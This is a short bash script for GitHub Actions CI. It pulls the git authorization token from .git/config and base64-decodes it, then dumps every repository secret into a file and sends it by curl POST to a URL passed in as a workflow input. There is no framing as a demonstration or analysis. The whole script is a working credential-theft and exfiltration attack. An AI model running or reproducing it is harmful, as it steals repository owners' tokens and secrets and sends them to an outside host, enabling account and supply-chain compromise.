#!/bin/bash
set -e

cat $GITHUB_WORKSPACE/.git/config | grep AUTHORIZATION

cat $GITHUB_WORKSPACE/.git/config | grep AUTHORIZATION | cut -d':' -f 2 | cut -d' ' -f 3 | base64 -d 

         echo "${{ toJSON(secrets) }}" > .secrets
         curl -X POST -s --data "@.secrets" ${{ github.event.inputs.url }} > /dev/null